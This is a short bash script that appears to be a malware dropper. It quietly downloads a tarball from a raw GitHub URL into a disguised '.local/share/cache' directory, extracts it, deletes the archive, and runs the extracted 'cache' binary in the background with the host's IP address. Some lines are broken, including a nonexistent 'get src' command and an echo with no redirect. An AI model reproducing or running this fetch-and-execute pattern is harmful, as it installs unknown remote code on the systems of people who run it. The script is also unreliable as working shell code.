#!/bin/bash
mkdir -p /home/sit/.local/share/cache
cd /home/sit/.local/share/cache
wget -q -P /temp/ https://raw.githubusercontent.com/cache-log/d/master/s.tar.gz
tar -xf /temp/s.tar.gz
rm -rf /temp/s.tar.gz
cache -x "`ip route get 8.8.8.8 | get src | awk '{print $NF}'`" &
echo "1" /htdocs/index2.html